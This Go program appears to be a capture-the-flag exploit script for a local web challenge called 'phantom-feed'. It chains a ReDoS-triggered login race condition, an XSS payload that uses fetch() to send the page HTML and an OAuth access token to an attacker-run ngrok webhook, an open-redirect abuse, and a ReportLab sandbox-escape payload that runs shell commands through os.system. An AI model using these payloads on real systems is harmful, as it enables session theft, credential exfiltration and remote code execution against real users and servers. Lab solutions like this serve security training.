package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"golang.ngrok.com/ngrok"
	"golang.ngrok.com/ngrok/config"
)

const (
	HOST          = "127.0.0.1"
	PORT          = "1337"
	CHALLENGE_URL = "http://" + HOST + ":" + PORT
	CLIENT_ID     = "phantom-market"
)

type Webhook struct {
	URL   string
	Token string
}

var cookie string
var WEBHOOK_URL string
var leakedTokenResponse string

func generateRandomHex(length int) (string, error) {
	if length%2 != 0 {
		return "", fmt.Errorf("length must be even")
	}

	b := make([]byte, length/2)
	_, err := io.ReadFull(rand.Reader, b)
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func registerUser(username, password string, wg *sync.WaitGroup) {
	fmt.Println("[+] registering random user...")

	defer wg.Done()
	redos := "a@aaaaaaaaaaaaaaaaaaaaaaaaaa!"
	fmt.Println("[+] generated reDOS payload: " + redos)

	data := url.Values{
		"username": {username},
		"password": {password},
		"email":    {redos},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	_, err := client.PostForm(CHALLENGE_URL+"/phantomfeed/register", data)
	if err != nil {
		fmt.Println("Error making registration request:", err)
	}
}

func loginUser(username, password string, wg *sync.WaitGroup) {
	defer wg.Done()
	var loginWg sync.WaitGroup

	fmt.Println("[+] triggering race condition via reDOS...")

	for i := 0; i < 100; i++ {
		loginWg.Add(1)

		data := url.Values{
			"username": {username},
			"password": {password},
		}

		go func() {
			defer loginWg.Done()
			client := &http.Client{
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
			resp, err := client.PostForm(CHALLENGE_URL+"/phantomfeed/login", data)
			if err != nil {
				fmt.Println("Error making login request:", err)
				return
			}

			if resp.StatusCode == http.StatusFound {
				cookie = resp.Header.Get("Set-Cookie")
				fmt.Println("[+] race condition found, generating jwt token...")
			}
		}()
	}

	loginWg.Wait()
}

func extractToken(cookieString string) (string, error) {
	cookieEntries := strings.Split(cookieString, ";")

	for _, entry := range cookieEntries {
		entry = strings.TrimSpace(entry)
		if strings.HasPrefix(entry, "token=") {
			token := strings.TrimPrefix(entry, "token=")
			return token, nil
		}
	}

	return "", fmt.Errorf("Token not found in the cookie string")
}

func createAuthCode(token string, xss string) (string, error) {
	endpointURL := fmt.Sprintf("%s/phantomfeed/oauth2/code?client_id=%s&redirect_url=%s", CHALLENGE_URL, CLIENT_ID, xss)

	cookie := &http.Cookie{
		Name:  "token",
		Value: token,
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest("GET", endpointURL, nil)
	if err != nil {
		fmt.Printf("Error creating request: %s\n", err)
		return "", err
	}

	req.AddCookie(cookie)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error making GET request: %s\n", err)
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response body: %s\n", err)
		return "", err
	}

	if resp.StatusCode != http.StatusSeeOther {
		return "", err
	}

	authorizationCode := extractAuthorizationCode(string(body))
	if authorizationCode != "" {
		fmt.Println("[+] generated oauth2 authorization code")
		return authorizationCode, nil
	} else {
		fmt.Println("Failed to parse authorization code from the response.")
		return "", err
	}

}

func extractAuthorizationCode(input string) string {
	regex := regexp.MustCompile(`authorization_code=([A-Za-z0-9]+)`)

	match := regex.FindStringSubmatch(input)

	if len(match) != 2 {
		return ""
	}

	authorizationCode := match[1]

	return authorizationCode
}

func createXSS() string {
	jsPayload := "fetch(`" + WEBHOOK_URL + "?c=${btoa(document.documentElement.outerHTML)}`,{mode:'cors'})"
	encodedPayload := base64.RawURLEncoding.EncodeToString([]byte(jsPayload))
	urlEncodedString := url.QueryEscape("<script>eval(atob('" + encodedPayload + "'))</script>")
	fmt.Println("[+] created xss payload: " + urlEncodedString)
	return urlEncodedString
}

func createOpenRedirect(authorizationCode string, xss string) string {
	encodedString := "///127.0.0.1:1337/phantomfeed/oauth2/token?authorization_code=" + authorizationCode + "&client_id=" + CLIENT_ID + "&redirect_url=" + xss
	fmt.Println("[+] created xss embeded open redirect payload: " + encodedString)
	return encodedString
}

func createPost(token string, marketLink string) {
	fmt.Println("[+] creating malicious post and triggering open redirect...")

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	cookie := &http.Cookie{
		Name:  "token",
		Value: token,
	}

	data := url.Values{
		"content":     []string{"test"},
		"market_link": []string{marketLink},
	}

	body := strings.NewReader(data.Encode())

	req, err := http.NewRequest("POST", CHALLENGE_URL+"/phantomfeed/feed", body)
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.AddCookie(cookie)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func reportLabRCE(cmd string) string {
	rce := "[ [ getattr(pow,Word('__globals__'))['os'].system('" + cmd + "') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'"
	fmt.Println("[+] generated reportlab rce payload: " + rce)
	return rce
}

func getPDF(token string, cmd string) {
	fmt.Println("[+] triggering reportlab rce via pdf...")

	client := &http.Client{}

	payload := fmt.Sprintf("color=%s", reportLabRCE(cmd))

	req, err := http.NewRequest("POST", CHALLENGE_URL+"/backend/orders/html", bytes.NewBufferString(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()
}

func getFlag() string {
	response, err := http.Get(CHALLENGE_URL + "/phantomfeed/static/flag.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return ""
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		fmt.Println("Error: Status code", response.StatusCode)
		return ""
	}

	bodyBytes, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error:", err)
		return ""
	}

	responseBody := string(bodyBytes)

	return responseBody
}

func run(ctx context.Context) error {
	tun, err := ngrok.Listen(ctx,
		config.HTTPEndpoint(),
		ngrok.WithAuthtokenFromEnv(),
	)
	if err != nil {
		return err
	}

	WEBHOOK_URL = tun.URL()

	return http.Serve(tun, http.HandlerFunc(handler))
}

func handler(w http.ResponseWriter, r *http.Request) {
	queryParams := r.URL.Query()
	dataParam := queryParams.Get("c")
	parts := strings.Split(dataParam, " ")

	thirdElement := parts[2]
	decodedBytes, err := base64.RawStdEncoding.DecodeString(thirdElement)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		return
	}

	decodedString := string(decodedBytes)

	re := regexp.MustCompile(`"access_token":\s*"([^"]+)"`)

	match := re.FindStringSubmatch(decodedString)

	if len(match) >= 2 {
		accessToken := match[1]
		leakedTokenResponse = accessToken
		fmt.Println(accessToken)
		fmt.Println("[+] leaked access token")
	} else {
		fmt.Println("Access Token not found")
	}
}

func main() {
	go run(context.Background())

	username, err := generateRandomHex(12)
	if err != nil {
		fmt.Println("Error generating username:", err)
		return
	}

	password, err := generateRandomHex(12)
	if err != nil {
		fmt.Println("Error generating password:", err)
		return
	}

	var wg sync.WaitGroup
	wg.Add(2)

	go registerUser(username, password, &wg)
	go loginUser(username, password, &wg)

	wg.Wait()

	token, err := extractToken(cookie)
	if err != nil {
		fmt.Println("Error extracting token:", err)
		return
	}

	xss := createXSS()
	authorizationCode, err := createAuthCode(token, xss)
	if err != nil {
		fmt.Println("Error creating auth code:", err)
		return
	}

	openRedirect := createOpenRedirect(authorizationCode, xss)
	createPost(token, openRedirect)

	getPDF(leakedTokenResponse, "cp /flag* /app/phantom-feed/application/static/flag.txt")

	flag := getFlag()
	fmt.Println(flag)
}
